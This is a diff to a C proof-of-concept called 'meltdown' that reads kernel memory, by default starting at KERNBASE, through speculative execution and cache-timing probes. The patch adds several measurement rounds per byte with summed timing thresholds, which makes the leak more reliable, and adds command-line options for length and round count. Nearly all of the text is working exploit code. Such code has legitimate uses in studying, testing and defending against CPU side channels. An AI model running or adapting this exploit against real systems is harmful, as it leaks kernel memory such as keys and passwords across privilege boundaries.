@@ -72,8 +72,10 @@ void spec_read(const uint8_t *addr, const uint8_t *probe, unsigned int shift);
  */
 static uint8_t *atk_addr;
 static size_t atk_len;
+static unsigned int atk_rounds;
 #define DFLT_ATK_ADDR	((uint8_t *)KERNBASE)
 #define DFLT_ATK_LEN	16
+#define DFLT_ATK_ROUNDS	3
 
 /*
  * Probe array
@@ -232,21 +234,30 @@ static void sighandler(int signo) { siglongjmp(jmpenv, signo); }
 static void
 meltdown(void)
 {
+	uint64_t deltas[PROBE_NLINES];
 	uint8_t line[16];
 	sig_t sigsegv;
-	unsigned int i, j;
+	uint64_t multhresh;
+	unsigned int i, r, v;
 	int signo;
 
+	warnx("reading %zu bytes from %p with %u rounds",
+	    atk_len, atk_addr, atk_rounds);
+	multhresh = threshold * atk_rounds;
 	sigsegv = signal(SIGSEGV, sighandler);
 	for (i = 0; i < atk_len; ++i) {
+		memset(deltas, 0, sizeof deltas);
+		for (r = 0; r < atk_rounds; ++r) {
+			rflush(probe, PROBE_NLINES, PROBE_LINELEN);
+			if ((signo = sigsetjmp(jmpenv, 1)) == 0)
+				spec_read(&atk_addr[i], probe, PROBE_SHIFT);
+			for (v = 0; v < PROBE_NLINES; ++v)
+				deltas[v] += timed_read(&probe[v * PROBE_LINELEN]);
+		}
 		line[i % 16] = 0;
-		rflush(probe, PROBE_NLINES, PROBE_LINELEN);
-		if ((signo = sigsetjmp(jmpenv, 1)) == 0)
-			spec_read(&atk_addr[i], probe, PROBE_SHIFT);
-		for (j = 0; j < PROBE_NLINES; ++j) {
-			uint64_t delta = timed_read(&probe[j * PROBE_LINELEN]);
-			if (delta < threshold) {
-				line[i % 16] = j;
+		for (v = 0; v < PROBE_NLINES; ++v) {
+			if (deltas[v] < multhresh) {
+				line[i % 16] = v;
 				break;
 			}
 		}
@@ -265,7 +276,7 @@ static void
 usage(void)
 {
 
-	fprintf(stderr, "usage: meltdown [-a addr] [-n len]\n");
+	fprintf(stderr, "usage: meltdown [-a addr | -s] [-l len] [-n rounds]\n");
 	exit(1);
 }
 
@@ -277,7 +288,7 @@ main(int argc, char *argv[])
 	unsigned int i;
 	int opt;
 
-	while ((opt = getopt(argc, argv, "a:n:s")) != -1)
+	while ((opt = getopt(argc, argv, "a:l:n:s")) != -1)
 		switch (opt) {
 		case 'a':
 			if (atk_addr != 0)
@@ -289,7 +300,7 @@ main(int argc, char *argv[])
 			if ((uintmax_t)atk_addr != umax)
 				errx(1, "address is out of range");
 			break;
-		case 'n':
+		case 'l':
 			if (atk_len != 0)
 				usage();
 			umax = strtoull(optarg, &end, 0);
@@ -298,6 +309,16 @@ main(int argc, char *argv[])
 			atk_len = umax;
 			if (atk_len == 0 || (uintmax_t)atk_len != umax)
 				errx(1, "length is out of range");
+			break;
+		case 'n':
+			if (atk_rounds != 0)
+				usage();
+			umax = strtoull(optarg, &end, 0);
+			if (end == optarg || *end != '\0')
+				errx(1, "invalid round count");
+			atk_rounds = umax;
+			if (atk_rounds == 0 || (uintmax_t)atk_rounds != umax)
+				errx(1, "round count is out of range");
 			break;
 		case 's':
 			if (atk_addr != 0)
@@ -319,6 +340,8 @@ main(int argc, char *argv[])
 		atk_addr = DFLT_ATK_ADDR;
 	if (atk_len == 0)
 		atk_len = DFLT_ATK_LEN;
+	if (atk_rounds == 0)
+		atk_rounds = DFLT_ATK_ROUNDS;
 
 	/* generate self-test data if required */
 	if (atk_addr == selftest) {
